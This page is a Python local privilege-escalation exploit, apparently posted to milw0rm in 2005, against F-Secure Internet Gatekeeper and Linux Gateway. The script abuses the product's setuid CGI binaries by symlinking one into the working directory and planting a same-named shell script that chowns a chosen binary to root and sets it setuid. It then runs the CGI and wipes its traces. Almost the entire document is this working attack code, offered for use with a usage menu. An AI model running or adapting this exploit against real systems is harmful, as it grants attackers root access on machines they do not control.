<html><head><title>F-Secure Internet Gatekeeper for linux < 2.15.484 Local Root Exploit</title></head><pre>#!/usr/bin/env python
#
# F-Secure Anti-Virus Internet Gatekeeper for Linux &lt;2.15.484 
# F-Secure Anti-Virus Linux Gateway &lt;2.16 # added line 3-4 for references /str0ke
#
##############################################################################
##  fsigk_exp.py: F-Secure Internet Gatekeeper for Linux local root exploit
##  acknowledgements: everyone in pure-elite and uDc.
##
##  coded by: xavier@tigerteam.se [http://xavsec.blogspot.com]
##############################################################################

##############################################################################
##  Make proper checks and import nessesary calls from modules.
##

try: 
    from sys import argv
except Exception: 
    print &quot;the 'sys' module could not be loaded&quot;
    raise SystemExit

try: 
    from os import unlink, stat, error, symlink, system, chmod
except Exception:
     print &quot;the 'os' module could not be loaded&quot;
     raise SystemExit

try: 
    import getopt
except Exception: 
    print &quot;the 'getopt' module could not be loaded&quot;
    raise SystemExit

##############################################################################
##  Constants.
##

__program__ = argv[0]
__version__ = &quot;0.1beta&quot;
__author__ = &quot;&lt;xavier@tigerteam.se&gt;&quot;
__lastedit__ = &quot;Thu Sep 22 23:18:39 EDT 2005&quot;
__usage__ = &quot;&quot;&quot;usage: %s [-options]

options:
       --version  show program's version number and exit.
      -h, --help  show this help message and exit.

      -s, --suid  file location to suid.
       -d, --dir  cgi directory.
     -c, --clean  cleans any left over files from the environment creation.
              -#  enter numerical value of vulnerable file to exploit. [list below]

 1: ifconfig_suid.cgi  |  2: reboot_suid.cgi     |  3: proxy_suid.cgi
 4: edittmpl_suid.cgi  |  5: version_suid.cgi    |  6: hostname_suid.cgi
 7: gateway_suid.cgi   |  8: halt_suid.cgi       |  9: edituserdb_suid.cgi
10: htpasswd_suid.cgi  | 11: pattern_up_suid.cgi | 12: license_suid.cgi
13: iptables_suid.cgi  | 14: dns_suid.cgi        | 15: pattern_autoup_suid.cgi
16: spam_list_suid.cgi | 17: diag_suid.cgi&quot;&quot;&quot; % (__program__)

#######################################################################################
## Functions.
##

def _write(file, payload):
    try: 
        open(file, 'w').write(payload)
        chmod(file, 0100)
    except Exception, err: 
        print (&quot;[-] %s&quot; % (err))

def _exists(path):
    try: 
        stat(path)
    except error:
        return False
    return True

def _handleopts():
    for opt in argv[1:]:
        if opt in (&quot;-h&quot;, &quot;--help&quot;): 
            print &quot;%s&quot; % (__usage__),
            raise SystemExit
        if opt in (&quot;-v&quot;, &quot;--version&quot;): 
            print &quot;%s (%s)&quot; % (__version__, __lastedit__),
            raise SystemExit

    _method_ = 'ifconfig_suid.cgi'
    _file_ = 'ifconfig.cgi'
    for opt in argv[1:]:
        if opt == &quot;-1&quot;: 
            _method_ = 'ifconfig_suid.cgi'
        elif opt == &quot;-2&quot;: 
            _method_ = 'reboot_suid.cgi'
            _file_ = 'reboot.cgi'
        elif opt == &quot;-3&quot;: 
            _method_ = 'proxy_suid.cgi'
            _file_ = 'proxy.cgi'
        elif opt == &quot;-4&quot;: 
            _method_ = 'edittmpl_suid.cgi'
            _file_ = 'edittmpl.cgi'
        elif opt == &quot;-5&quot;: 
            _method_ = 'version_suid.cgi'
            _file_ = 'version.cgi'
        elif opt == &quot;-6&quot;: 
            _method_ = 'hostname_suid.cgi'
            _file_ = 'hostname.cgi'
        elif opt == &quot;-7&quot;: 
            _method_ = 'gateway_suid.cgi'
            _file_ = 'gateway.cgi'
        elif opt == &quot;-8&quot;: 
            _method_ = 'halt_suid.cgi'
            _file_ = 'halt.cgi'
        elif opt == &quot;-9&quot;: 
            _method_ = 'edituserdb_suid.cgi'
            _file_ = 'edituserdb.cgi'
        elif opt == &quot;-10&quot;: 
            _method_ = 'htpasswd_suid.cgi'
            _file_ = 'htpasswd.cgi'
        elif opt == &quot;-11&quot;: 
            _method_ = 'pattern_up_suid.cgi'
            _file_ = 'pattern_up.cgi'
        elif opt == &quot;-12&quot;: 
            _method_ = 'license_suid.cgi'
            _file_ = 'license.cgi'
        elif opt == &quot;-13&quot;:
            _method_ = 'iptables_suid.cgi'
            _file_ = 'iptables.cgi'
        elif opt == &quot;-14&quot;: 
            _method_ = 'dns_suid.cgi'
            _file_ = 'dns.cgi'
        elif opt == &quot;-15&quot;: 
            _method_ = 'pattern_autoup_suid.cgi'
            _file_ = 'pattern_autoup.cgi'
        elif opt == &quot;-16&quot;: 
            _method_ = 'spam_list_suid.cgi'
            _file_ = 'spam_list.cgi'
        elif opt == &quot;-17&quot;: 
            _method_ = 'diag_suid.cgi'
            _file_ = 'diag.cgi'
        else: 
            pass

    try:
        opts = getopt.getopt(argv[1:], 'c1234567890s:d:', ['clean', \
                                                          'suid=', \
                                                          'dir='])[0]
    except Exception, (err):
        print &quot;[-] %s&quot; % (err),
        raise SystemExit

    _dir_ = None
    _payload_ = None
    _combine_ = None

    for o, a in opts:
        if o in (&quot;-c&quot;, &quot;--clean&quot;): 
            _clean()
            print &quot;[*] done&quot;
            raise SystemExit
        if o in (&quot;-d&quot;, &quot;--dir&quot;): 
            if _exists(a): 
                _dir_ = a
            else: 
                print &quot;[-] unable to access the %s directory&quot; % (_dir_),
                raise SystemExit
        if o in (&quot;-s&quot;, &quot;--suid&quot;): 
            if _exists(a): 
                _payload_ = _suid(a)
            else: 
                print &quot;[-] unable to access binary.&quot;
                raise SystemExit

    if _dir_ == None: 
        print &quot;[-] no directory was given [try -h for help menu]&quot;
        raise SystemExit
    if _payload_ == None: 
        print &quot;[-] enter binary to suid [try -h for help menu]&quot;
        raise SystemExit
    _combined_ = &quot;%s/%s&quot; % (_dir_, _method_)
    if not _exists(_combined_): 
        print &quot;[-] method not possible, try another.&quot;
        raise SystemExit

    print &quot;[*] creating environment...&quot;
    try:
        symlink('%s/%s' % (_dir_, _method_), 'runbad')
        _write(_file_, _payload_)
    except Exception, err:
        raise SystemExit


def _suid(file):
    _suid_ = &quot;&quot;&quot;#!/bin/sh
chown 0.0 %(file)s
chmod 4755 %(file)s
&quot;&quot;&quot; % (locals())
    return _suid_


def _clean():
    try:
        files = ['runbad', 'ifconfig.cgi', 'reboot.cgi', 'proxy.cgi', 
                 'edittmpl.cgi', 'version.cgi', 'hostname.cgi', 'gateway.cgi',
                 'halt.cgi', 'edituserdb.cgi', 'htpasswd.cgi', 'pattern_up.cgi',
                 'license.cgi', 'iptables.cgi', 'dns.cgi', 'pattern_autoup.cgi', 
                 'spam_list.cgi', 'diag_suid.cgi']

        for file in files:
            if _exists(file): unlink(file)

    except Exception, err:
        print &quot;[-] %s&quot; % (err),


##############################################################################
##  main() // main code.
##

def main():
    try:
        print &quot;[INFO] F-Secure Internet Gatekeeper for Linux &lt;=2.10-431 local exploit by %s&quot; % (__author__)
        print &quot;[*] handling options, arguments...&quot;
        _handleopts()
        print &quot;[*] executing exploit...&quot;
        system('./runbad')
        print &quot;[*] cleaning...&quot;
        _clean()
        print &quot;[*] done... try executing the specified binary.&quot;
    except KeyboardInterrupt:
        print &quot;[-] caught keyboard interuption&quot;
        raise SystemExit
    except Exception, (err): 
        _clean()
        raise SystemExit

if __name__ == '__main__': main()

# milw0rm.com [2005-11-07]</pre></html>